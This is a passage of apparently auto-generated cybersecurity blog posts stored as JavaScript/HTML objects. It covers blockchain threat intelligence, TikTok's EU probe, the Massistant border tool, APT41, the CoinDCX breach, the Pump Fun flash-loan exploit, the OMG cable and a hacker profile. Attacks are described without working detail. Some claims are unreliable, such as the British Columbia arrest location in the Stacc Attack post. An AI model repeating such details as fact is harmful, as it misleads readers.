  `},{id:"blockchain-decentralized-threat-intelligence-2025",title:"🔗 Blockchain-Enabled Decentralized Threat Intelligence Sharing: When Trust Is the Target, Decentralization Is the Shield",date:"2025-07-19",author:"Sriniketh Sudheendra & Dr. Neetha S.S",summary:"In an era where cyberattacks move faster than defenses, traditional threat intelligence systems are failing. This blog explores how blockchain-powered decentralized intelligence sharing provides the speed, resilience, and trust needed to outsmart attackers.",tags:["blockchain","threat intelligence","cybersecurity","decentralization","trust"],imageKey:"blockchainThreatIntelBanner",content:`
    <div style="background-color:#f6f8fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🔗 Blockchain-Enabled Decentralized Threat Intelligence Sharing</h3><br>
        <p style="font-style:italic;">When trust is under attack, decentralization becomes the shield.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🌐 Why We Need a New Approach</h4><br>
        <p>Modern cyberattacks don’t respect organizational boundaries. Ransomware gangs, state-sponsored groups, and hacktivists share tools and information in underground forums — collaborating faster than defenders can react. Meanwhile, defenders remain siloed, reluctant to share threat intelligence due to privacy, compliance, and competitive concerns.</p>
        <p>This mismatch creates a dangerous gap: while attackers operate like a swarm, defenders operate like islands.</p>
        <p>It’s time for defenders to adopt a more collaborative, decentralized model to keep pace with threats.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🚩 Shortcomings of Centralized Threat Intelligence</h4><br>
        <ul>
          <li>⏳ <strong>Latency:</strong> Central authorities take too long to validate, sanitize, and share intelligence — attackers don’t wait.</li>
          <li>🔒 <strong>Trust Deficit:</strong> Many organizations fear reputational or legal consequences if they share sensitive data openly.</li>
          <li>🎯 <strong>Single Point of Failure:</strong> Centralized systems become juicy targets for attackers.</li>
          <li>🚪 <strong>Information Bottlenecks:</strong> Valuable local intelligence may never reach the broader community.</li>
          <li>🧊 <strong>Rigid Hierarchies:</strong> Centralized bodies may prioritize certain sectors or geographies over others.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🔗 How Blockchain Solves These Problems</h4><br>
        <p>Blockchain technology offers a secure, tamper-proof, and transparent way to share threat intelligence without needing to rely on a single authority.</p>
        <ul>
          <li>🌍 <strong>Decentralization:</strong> Every node (organization, researcher, sensor) contributes & accesses data independently.</li>
          <li>📜 <strong>Immutability:</strong> Once threat data is recorded — e.g., malicious URLs, IPs, malware hashes — it cannot be altered or deleted.</li>
          <li>🔐 <strong>Transparency with Privacy:</strong> Blockchain can allow sharing of metadata or anonymized indicators while keeping sensitive internal details hidden.</li>
          <li>⚡ <strong>Real-Time Sharing:</strong> Participants can view new indicators as soon as they’re published on the chain, enabling faster response.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📈 Real-World Success: The Cyber Shield Collective</h4><br>
        <p>In 2024, 50 global banks formed the <strong>Cyber Shield Collective</strong> — a private blockchain-based threat intelligence network. Within six months, they:</p>
        <ul>
          <li>📉 Reduced phishing attacks by 38%.</li>
          <li>🔗 Improved response times to emerging threats by 60%.</li>
          <li>📝 Created a tamper-proof audit trail for regulators and forensic teams.</li>
        </ul>
        <p>This initiative proved that decentralized sharing is not just possible — it’s powerful.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🪙 Beyond Banking: Where Else Can This Help?</h4><br>
        <ul>
          <li>🏥 <strong>Healthcare:</strong> Share indicators of ransomware or medical device vulnerabilities across hospitals.</li>
          <li>🏢 <strong>Critical Infrastructure:</strong> Energy, transportation, and water sectors can collaboratively defend against nation-state actors.</li>
          <li>🎓 <strong>Academia & Research:</strong> Universities and labs can publish findings securely while maintaining attribution.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">💡 How to Get Started</h4><br>
        <ul>
          <li>✅ Evaluate your risk appetite and compliance requirements.</li>
          <li>✅ Join or form a consortium of trusted peers.</li>
          <li>✅ Use permissioned blockchains for sensitive environments.</li>
          <li>✅ Develop APIs & automation to feed intelligence directly into your SOC (Security Operations Center).</li>
          <li>✅ Train staff to understand blockchain concepts and security controls.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">📣 Final Thoughts</h4><br>
        <p>The future of cybersecurity depends on collaboration. Blockchain gives us the tools to collaborate without fear — to share without losing privacy — and to fight back against attackers who already act collectively.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“When trust is decentralized, resilience becomes inevitable.”</blockquote>
        <p>We are entering an era where no single entity can defend itself alone. Together, armed with technology and trust, we can close the gap between attacker and defender — one block at a time.</p>
      </section>

      <section style="margin-top:20px;background:#f1f1f1;padding:15px;border-radius:8px;">
        <h4 style="color:#555;">✍️ About the Authors</h4><br>
        <p><strong>Sriniketh Sudheendra</strong> is a BCA student at Christ University focusing on cybersecurity and emerging blockchain technologies.<br>
        <strong>Dr. Neetha S.S</strong> is an Assistant Professor of Computer Science at Christ University, specializing in cybersecurity, AI, and digital forensics. Together, they bring academic rigor and fresh insight into blockchain’s role in cybersecurity.</p>
      </section>

    </div>
  `},{id:"tiktok-eu-privacy-investigation-2025",title:"📄 TikTok Faces Fresh EU Privacy Investigation Over China Data Transfers",date:"2025-07-20",author:"EthicalByte",summary:"The European Data Protection Board has launched a sweeping investigation into TikTok’s cross-border data practices. The outcome could reshape privacy enforcement and redefine global data flows.",tags:["TikTok","Data Privacy","GDPR","EU Regulations","China Data","Cybersecurity","Cross-Border"],imageKey:"tiktokEUPrivacyBanner",content:`
    <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📄 TikTok Faces Fresh EU Privacy Investigation Over China Data Transfers</h3><br>
        <p style="font-style:italic;">As data becomes the new currency, Europe is asking: where does yours go?</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🇪🇺 What Happened?</h4><br>
        <p>The **European Data Protection Board (EDPB)** announced a fresh investigation into TikTok’s handling of **cross-border data transfers**, especially those going to China. TikTok, owned by China-based ByteDance, has long been under scrutiny over its privacy practices and potential risks posed to EU citizens’ data sovereignty.</p>
        <p>This move comes on the heels of rising tensions between privacy advocates and global tech firms, many of which store and process data outside the jurisdictions where it was collected.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">📜 Why This Matters</h4><br>
        <ul>
          <li>🔒 <strong>User Trust:</strong> Data privacy is not just a regulatory issue — it’s a trust issue. Users expect platforms to protect their personal information, regardless of where it’s processed.</li>
          <li>🏛️ <strong>Legal Obligations:</strong> GDPR requires clear justification and safeguards for any transfer of EU data outside the bloc.</li>
          <li>🌐 <strong>Geopolitical Tensions:</strong> The scrutiny reflects broader unease over Chinese influence in global tech and concerns of surveillance or misuse of data.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📈 What Could Happen?</h4><br>
        <ul>
          <li>⚖️ TikTok could face hefty fines if found non-compliant — GDPR allows penalties of up to 4% of annual global turnover.</li>
          <li>🔗 New restrictions might be imposed on how TikTok collects and processes data in Europe.</li>
          <li>🚧 A chilling effect may occur, forcing other companies to re-evaluate their cross-border data strategies.</li>
          <li>📝 Could catalyze stronger data residency laws requiring EU user data to remain within EU servers.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📜 A Pattern of Scrutiny</h4><br>
        <p>This isn’t the first time TikTok has been questioned over its data practices:</p>
        <ul>
          <li>In 2020, India banned TikTok citing privacy and national security concerns.</li>
          <li>In 2022, the US considered similar measures, prompting TikTok to set up “Project Texas” to segregate US data.</li>
          <li>Several EU countries, including Ireland and France, have already opened local probes into TikTok’s compliance with GDPR.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔎 What Should Businesses & Users Do?</h4><br>
        <p>This investigation is a clear signal to businesses and individuals alike:</p>
        <ul>
          <li>✅ Businesses should conduct **data mapping exercises** to identify where data resides and ensure GDPR‑compliant safeguards are in place.</li>
          <li>✅ Adopt **data minimization** — only collect and transfer what is absolutely necessary.</li>
          <li>✅ Users should regularly review privacy policies and limit permissions they grant to apps.</li>
          <li>✅ Governments & regulators may start pushing for **data localization** to safeguard national interests.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Looking Ahead</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In a globalized internet, privacy has no borders — but regulations do.”</blockquote>
        <p>This case underscores a broader struggle: how to balance innovation and global access with the need for sovereignty, transparency, and accountability.</p>
        <p>As digital citizens, it is vital to stay informed and demand better practices from the platforms we trust with our data.</p>
      </section>

      

    </div>
  `},{id:"china-massistant-phone-surveillance-2025",title:"📱 China’s “Massistant” Tool Secretly Extracts Data From Phones at the Border",date:"2025-07-21",author:"EthicalByte",summary:"A shocking report reveals that Chinese border police are using a secretive tool, Massistant, to silently extract GPS, messages, and even encrypted chats from visitors’ phones — raising global privacy alarms.",tags:["China","Massistant","Privacy","Surveillance","Border Security","Cybersecurity"],imageKey:"massistantSurveillanceBanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📱 China’s “Massistant” Tool Secretly Extracts Data From Phones at the Border</h3><br>
        <p style="font-style:italic;">If your phone crosses the border, so does your privacy.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🔥 What Happened?</h4><br>
        <p>According to a recent <a href="https://thehackernews.com/2025/07/chinas-massistant-tool-secretly.html" target="_blank">investigation</a>, China’s border police have been deploying a covert tool called <strong>Massistant</strong> to extract sensitive data from travelers’ phones during inspections.</p>
        <p>This tool silently installs itself, scrapes the device for GPS history, Signal chats, text messages, contacts, and photos — and then disappears without a trace.</p>
        <p>While currently known to target Android devices, researchers fear that **iPhones could be next**.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Why It Matters</h4><br>
        <ul>
          <li>📍 <strong>Invasive Surveillance:</strong> Users are unaware their data has been harvested.</li>
          <li>🕵️ <strong>Targets Everyone:</strong> Not just suspects — ordinary travelers are exposed.</li>
          <li>🔒 <strong>Signal Compromised:</strong> Even secure messaging apps like Signal may be decrypted if local data is copied.</li>
        </ul>
        <p>Massistant shows just how far state surveillance can reach when physical access to devices is involved.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📈 How Does It Work?</h4><br>
        <ul>
          <li>⚡ Installs silently while the device is in border agents’ possession.</li>
          <li>📂 Crawls through files, app data, GPS logs, chat histories, and downloads copies.</li>
          <li>🧹 Wipes itself clean from the phone after completing the operation, leaving no evidence behind.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ What Can You Do?</h4><br>
        <ul>
          <li>✅ Travel with a clean device or “travel phone” with minimal personal data.</li>
          <li>✅ Log out and uninstall sensitive apps before entering high‑risk regions.</li>
          <li>✅ Use full‑device encryption & strong passcodes.</li>
          <li>✅ Avoid unlocking your phone if not legally required to do so.</li>
        </ul>
        <p>Awareness and preparation can significantly reduce the risks to your digital privacy.</p>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In an age where your phone holds your life, crossing a border shouldn’t mean surrendering your privacy.”</blockquote>
        <p>Massistant serves as a wake‑up call about the fragility of privacy when physical device access is involved. It’s crucial to take proactive steps and stay vigilant in an increasingly monitored world.</p>
      </section>

    </div>
  `},{id:"apt41-africa-sharepoint-c2-july-2025",title:"🕵️ China-linked APT41 Hacks African Governments Using SharePoint as C2",date:"2025-07-22",author:"EthicalByte",summary:"APT41, a China-backed hacking group, breached African government IT networks by abusing internal SharePoint servers as command‑and‑control infrastructure, using stolen admin credentials, DLL sideloading, and fake GitHub domains.",tags:["APT41","China","Africa","SharePoint","CyberEspionage","ThreatIntel"],imageKey:"apt41AfricaSharePointBanner",content:`
    <div style="background-color:#f5f7fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🕵️ China-linked APT41 Hacks African Governments Using SharePoint as C2</h3><br>
        <p style="font-style:italic;">Even trusted internal servers can become a weapon in the hands of attackers.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🔥 What Happened?</h4><br>
        <p>A new investigation has revealed that <strong>APT41</strong> — a Chinese state‑linked advanced persistent threat group — infiltrated African government networks using creative and stealthy techniques.</p>
        <p>Most notably, they abused internal <strong>Microsoft SharePoint servers</strong> as command‑and‑control (C2) nodes to control malware and exfiltrate data while blending into legitimate traffic.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🧰 Tactics & Techniques</h4><br>
        <ul>
          <li>🔑 Stolen administrator credentials for initial access.</li>
          <li>🖇️ <strong>DLL sideloading</strong> — loading malicious code via trusted apps.</li>
          <li>🌐 <strong>Fake GitHub domains</strong> — masking malicious traffic as legitimate developer activity.</li>
          <li>🗃️ Exploiting internal SharePoint servers as covert C2 infrastructure.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🌍 Why Africa?</h4><br>
        <p>This campaign highlights Africa’s growing geopolitical and economic significance. APT41 targeted sensitive policy documents, trade negotiations, and natural resource data — signaling heightened Chinese interest in the region.</p>
        <p>This is one of the few publicly reported APT41 campaigns focused on Africa, showing that no region is safe from cyber‑espionage.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ What Should Organizations Do?</h4><br>
        <ul>
          <li>✅ Rotate and harden admin credentials; enable MFA.</li>
          <li>✅ Monitor SharePoint servers and internal web traffic for anomalies.</li>
          <li>✅ Block or closely monitor traffic to lookalike GitHub domains.</li>
          <li>✅ Implement whitelisting and restrict DLL execution paths.</li>
          <li>✅ Conduct regular threat hunting exercises based on APT41 TTPs.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“When even your internal tools are suspect, vigilance inside the perimeter becomes critical.”</blockquote>
        <p>APT41’s latest activity is a stark reminder that internal platforms like SharePoint are no longer “safe zones.” Organizations must adopt a <strong>zero‑trust mindset</strong> and proactively monitor their networks to stay ahead of sophisticated threats.</p>
      </section>

    </div>
  `},{id:"coindcx-44m-internal-breach-july-2025",title:"🔐 CoinDCX Suffers $44M Internal Fund Breach — Customer Funds Remain Safe",date:"2025-07-23",author:"EthicalByte",summary:"CoinDCX, one of India’s leading crypto exchanges, suffered a $44 million internal breach from an operational account. No customer funds were affected, thanks to their secure cold wallet setup and swift incident response.",tags:["CoinDCX","Crypto Breach","Operational Wallet","Web3 Security","India","Centralized Exchange"],imageKey:"coindcxBreachBanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🔐 CoinDCX Suffers $44M Internal Fund Breach — Customer Funds Remain Safe</h3><br>
        <p style="font-style:italic;">Proof that even non-customer wallets need bulletproof security.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🚨 What Happened?</h4><br>
        <p>CoinDCX confirmed a <strong>sophisticated breach</strong> involving one of its internal operational wallets — not linked to customer holdings — leading to a loss of approximately <strong>$44 million (₹368–378 crore)</strong>. This wallet was specifically used to maintain liquidity across partner exchanges.</p>
        <p>Investigators identified unauthorized transactions routed through obfuscation platforms like <strong>Tornado Cash</strong>, with assets eventually diverted to <strong>Ethereum and Solana wallets</strong>.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Discovery & Response Timeline</h4><br>
        <ul>
          <li>🕵️ Blockchain investigators <strong>Cyvers</strong> and <strong>ZachXBT</strong> flagged the anomaly through on-chain behavior monitoring.</li>
          <li>🔐 CoinDCX <strong>immediately isolated</strong> the compromised account, suspended the affected Web3 wallet functionality, and launched a full forensic audit.</li>
          <li>💰 All trading activity, customer withdrawals, and INR deposits remained fully operational during the incident.</li>
          <li>💼 The company announced that <strong>internal reserves</strong> (treasury) will be used to absorb the losses, with <strong>zero impact to users</strong>.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📢 Official Statement Highlights</h4><br>
        <p>CoinDCX reaffirmed its commitment to transparency and security, stating:</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“While this incident impacted a specific operational wallet, all customer assets were and remain completely safe in our cold storage system.”</blockquote>
        <ul>
          <li>✅ Working closely with <strong>CERT-In</strong> and global cybersecurity firms to trace and recover assets.</li>
          <li>✅ Initiated a new <strong>bug bounty program</strong> to crowdsource vulnerabilities from ethical hackers.</li>
          <li>✅ Promised regular updates as the investigation progresses.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d1ecf1;padding:15px;border-radius:8px;">
        <h4 style="color:#0c5460;">📉 Context & Industry Comparison</h4><br>
        <p>This ranks as India’s <strong>second-largest exchange breach</strong>, after the infamous <strong>$235 million WazirX hack</strong> in 2024. Though smaller, the incident raises broader concerns around how internal wallets are managed across centralized exchanges.</p>
        <p>It underscores a growing trend: <strong>customer funds might be safe, but CEX infrastructure remains vulnerable</strong> to gaps in internal privilege control, wallet isolation, and real-time monitoring.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ Key Takeaways</h4><br>
        <ul>
          <li>✅ <strong>Cold wallet separation worked</strong>: Customer assets were never exposed or compromised.</li>
          <li>⚠️ <strong>Hot & operational wallets require layered monitoring and privilege access controls.</strong></li>
          <li>💬 <strong>Communication was swift</strong>, public, and transparent — helping protect the company’s trust score.</li>
          <li>🔧 <strong>Bug bounty initiative</strong> shows CoinDCX is actively learning and adapting post-incident.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌐 Final Reflection</h4><br>
        <p>As centralized exchanges evolve, so do the attack surfaces. Even systems designed for internal liquidity carry major risks when not monitored rigorously. CoinDCX’s breach may serve as a benchmark moment for CEXs worldwide to reassess internal wallet security and develop stricter frameworks for incident detection.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In Web3, your weakest wallet is your loudest breach.”</blockquote>
      </section>

    </div>
  `},{id:"cyber-heist-stacc-attack-july-2025",title:'💰 Cyber Heist Chronicles: The $1.9 Million "Stacc Attack"',date:"2025-07-24",author:"EthicalByte",summary:"A Canadian hacker named “StaccOverflow” (Jarett Dunn) exploited a Solana DeFi app, live-streaming a $1.9M flash loan hack. The event triggered debates on ethics, law, and the evolution of DeFi security.",tags:["DeFi","Flash Loan","Crypto Crime","StaccOverflow","Pump Fun","Solana","Smart Contract Hack"],imageKey:"staccAttackBanner",content:`
    <div style="background:#fdfdfd;padding:24px;border-radius:12px;border:1px solid #e0e0e0;font-family:sans-serif;">

      <div style="text-align:center;margin-bottom:20px;">
        <h2 style="color:#1a1a1a;">💰 Cyber Heist Chronicles: The $1.9 Million "Stacc Attack"</h2>
        <p style="font-style:italic;">A DeFi exploit that blurs the line between ethical hacking and criminality — and it happened in broad digital daylight.</p>
      </div>

      <section>
        <h3 style="color:#e63946;">📉 What Actually Happened?</h3>
        <p>Canadian software developer <strong>Jarett Dunn</strong>, known by the alias <strong>“StaccOverflow”</strong>, carried out a <strong>$1.9 million flash loan exploit</strong> against the Solana-based meme token platform <strong>Pump Fun</strong>. What’s extraordinary is that he <em>live-streamed</em> and <em>tweeted</em> the entire event in real time — all under the claim of “ethical hacking.”</p>
        <ul>
          <li>⚠️ Exploited a smart contract vulnerability involving flash loan logic</li>
          <li>⏱️ Executed the attack in seconds</li>
          <li>🌪️ Obfuscated fund movement via Tornado Cash</li>
          <li>🎙️ Livestreamed and tweeted every step as a “public bug bounty”</li>
          <li>🚓 Arrested within hours in British Columbia</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:16px;border-radius:8px;">
        <h3 style="color:#856404;">⚖️ Ethical Hacking... or Crime?</h3>
        <p>Stacc claimed the exploit was to prove a point — that <strong>Pump Fun</strong> was insecure. He argued it was a “white-hat action,” even referring to the funds as a <em>bounty</em> and saying he was doing the project a favor.</p>
        <p>But authorities didn’t see it that way. His lack of disclosure, immediate financial gain, and use of mixers were all flagged as criminal behavior. He was arrested without bail, pending cybercrime charges.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#2a9d8f;">🛠️ Technical Breakdown</h3>
        <p>Flash loans in DeFi allow users to borrow huge amounts of crypto instantly and repay them within the same transaction. Stacc used this mechanism to manipulate token pricing, buying undervalued tokens and reselling at inflated values — effectively draining liquidity.</p>
        <ul>
          <li>🧠 Vulnerability exploited in Pump Fun’s smart contract pricing model</li>
          <li>🔄 Flash loan loop executed on-chain within seconds</li>
          <li>🧩 Asset laundering via Tornado Cash</li>
          <li>📉 Liquidity pools depleted, price manipulation confirmed</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:16px;border-radius:8px;">
        <h3 style="color:#155724;">🔐 What This Means for DeFi</h3>
        <ul>
          <li>🚨 Flash loans remain a top attack vector for under-secured smart contracts</li>
          <li>📜 Projects must implement and enforce <strong>bug bounty programs</strong> and <strong>disclosure channels</strong></li>
          <li>👥 There’s no legal gray area when millions are stolen — intent does not excuse impact</li>
          <li>🔍 The DeFi ecosystem urgently needs better <strong>on-chain forensics</strong> and exploit alerts</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#264653;">🎙️ Darknet Diaries Feature</h3>
        <p>The entire incident has been covered in <strong>Episode 152</strong> of <a href="https://darknetdiaries.com/episode/152/" target="_blank">Darknet Diaries</a>, breaking down the event, motivations, technology, and arrest. Highly recommended for cybersecurity pros and enthusiasts alike.</p>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:16px;border-radius:8px;">
        <h3 style="color:#1a73e8;">🧠 Final Thoughts</h3>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;margin:10px 0;">
          “In DeFi, it's not just code that gets exploited — it’s trust.”
        </blockquote>
        <p>The “Stacc Attack” is a cautionary tale. Transparency is powerful, but so is accountability. While some may applaud the guts it took to livestream a heist, the law doesn’t — and won’t — applaud intent without consent. Ethical hacking must walk a razor-thin line. Are we ready to redefine what that line even looks like in Web3?</p>
      </section>

    </div>
  `},{id:"usb-cable-hacking-mg-july-2025",title:"🎙️ The USB Cable That Could Hack You: The Story of MG",date:"2025-07-25",author:"Ethicalbyte",summary:"A deep dive into the OMG Cable, a weaponized USB device created by hacker MG, capable of injecting keystrokes, executing remote payloads, and exposing the limits of hardware trust. What looks like a normal cable could be a hacker's backdoor.",tags:["Hardware Hacking","Cybersecurity","OMG Cable","MG","DEF CON","USB Exploits"],imageKey:"usbCableHackingBanner",content:`
  <div style="background:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;margin-bottom:20px">
      <h2>🔌 The USB Cable That Could Hack You — The Story of MG</h2>
      <p><i>Published: July 25, 2025 | Author: Cyber Talk Team</i></p>
    </div>

    <section>
      <h3>🧠 Meet MG: Hacker Turned Hardware Security Legend</h3>
      <p>MG is a name that echoes through DEF CON and Black Hat. A brilliant hardware hacker who stunned the cybersecurity world with the creation of the <strong>OMG Cable</strong> — a USB cable that looks normal but behaves like a cyber weapon.</p>
      <p>The cable can connect over Wi-Fi, impersonate a keyboard (HID), and inject commands or malware in seconds — all while remaining invisible to unsuspecting users.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>⚙️ What Makes the OMG Cable So Dangerous?</h3>
      <ul>
        <li>✅ <strong>Indistinguishable from standard cables</strong></li>
        <li>📶 <strong>Wi-Fi Controlled</strong> — attackers can send commands wirelessly</li>
        <li>🖥️ <strong>Keystroke Injection</strong> — launches attacks within seconds</li>
        <li>🚫 <strong>Stealth Mode</strong> — leaves virtually no trace on the system</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>📽️ Evolution Timeline of the OMG Cable</h3>
      <table style="width:100%;border:1px solid #ccc;text-align:left;border-collapse:collapse;">
        <thead>
          <tr><th style="border:1px solid #ccc;padding:8px;">Year</th><th style="border:1px solid #ccc;padding:8px;">Development</th></tr>
        </thead>
        <tbody>
          <tr><td style="border:1px solid #ccc;padding:8px;">2019</td><td style="border:1px solid #ccc;padding:8px;">First DIY prototype with Arduino internals</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2020</td><td style="border:1px solid #ccc;padding:8px;">DEF CON demo and public awareness</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2022</td><td style="border:1px solid #ccc;padding:8px;">Encrypted Wi-Fi payload support added</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2023</td><td style="border:1px solid #ccc;padding:8px;">Geo-fencing, kill-switch, delayed triggers introduced</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2025</td><td style="border:1px solid #ccc;padding:8px;">USB-C and cross-platform support released</td></tr>
        </tbody>
      </table>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>💡 Key Takeaways</h3>
      <ul>
        <li>🧠 Even a cable can become a cybersecurity risk</li>
        <li>🚷 Never trust peripherals from unknown sources</li>
        <li>🔐 Implement USB access policies on enterprise devices</li>
        <li>🧰 Red teams are using OMG Cable for realistic simulations</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>🎧 Want More?</h3>
      <p>MG’s story and tools are discussed in depth in <strong>Darknet Diaries Ep. 154: “The Cable”</strong>. It explores how hardware trust has become a battleground for cybersecurity experts.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>🔐 Final Thoughts</h3>
      <blockquote style="border-left:4px solid #28a745;padding-left:10px;">“In cybersecurity, never assume the harmless is harmless.”</blockquote>
      <p>The OMG Cable is a wake-up call: If a USB cable can be a hacker’s gateway, what else can be? From firmware to hardware, vigilance is the new default.</p>
    </section>
  </div>
`},{id:"darknet-diaries-greg-laughing-mantis-ep160-july-2025",title:"🎧 “Greg” (aka Laughing Mantis)",date:"2025-07-27",author:"EthicalByte",summary:"From teenage hacker to InfoSec advocate, Greg Linares—once known as Laughing Mantis—shares his gripping journey through early cybercrime, arrest, and redemption in this must-hear episode of Darknet Diaries.",tags:["Darknet Diaries","Hacker Story","Youth in Cybersecurity","Ethical Hacking","Redemption"],imageKey:"laughingMantisBanner",content:`
  <div style="background:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;margin-bottom:20px">
      <h2>🎧 “Greg” (aka Laughing Mantis)</h2><br>
      <p><i>Published: July 28, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3>🔍 Who is Greg Linares?</h3><br>
      <p>Known in online circles as <strong>Laughing Mantis</strong>, Greg Linares was once one of the youngest hackers arrested in Arizona. His story unfolds in <em>Darknet Diaries EP 160</em>, where he shares his raw and honest journey—from digital defiance to personal redemption.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>⚡ Rise, Fall, and Rise Again</h3><br>
      <ul>
        <li>🧠 <strong>Early Genius:</strong> Greg started hacking in his early teens, impressing underground forums with his network exploits and manipulation skills.</li>
        <li>🚔 <strong>Reality Check:</strong> A bold mistake led to his arrest as a teenager—forever changing his life trajectory.</li>
        <li>🔁 <strong>Reinvention:</strong> Greg now openly discusses the ethics of hacking and helps educate the next generation on responsible infosec practices.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>💡 Lessons from the Life of Laughing Mantis</h3><br>
      <ul>
        <li>⚖️ Talent must be paired with <strong>ethics</strong> and responsibility.</li>
        <li>🧩 One reckless decision can ripple through a lifetime.</li>
        <li>🔄 Redemption is real—growth comes from honest reflection and change.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>🛠️ Actionable Insights</h3><br>
      <ul>
        <li>✅ Support youth mentorships in cybersecurity spaces.</li>
        <li>📚 Encourage ethical coding and digital responsibility education early.</li>
        <li>🎓 Give second chances—today’s rebel could be tomorrow’s innovator.</li>
        <li>🧭 Organizations should identify and engage young cyber talent before legal issues occur.</li>
        <li>🔐 Better collaboration between legal systems and educational institutions can redirect potential into progress.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>🎯 Final Thoughts</h3><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Greg’s story isn’t just about hacking—it’s about humanity, healing, and how the infosec world can be a space for growth.”</blockquote>
